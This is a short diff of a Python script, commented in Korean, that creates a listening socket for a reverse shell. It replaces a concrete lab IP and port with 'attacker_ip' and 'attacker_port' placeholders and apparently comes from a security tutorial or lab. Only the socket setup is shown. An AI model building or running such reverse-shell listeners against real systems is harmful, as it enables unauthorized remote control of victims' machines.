@@ -1,8 +1,8 @@
 import socket
 
 # 리버스 쉘이 연결될 IP 주소와 포트 번호 
-bind_ip = "192.168.56.5"
-bind_port = 7777
+bind_ip = "attacker_ip"
+bind_port = "attacker_port"
 
 # 소켓 객체 생성
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
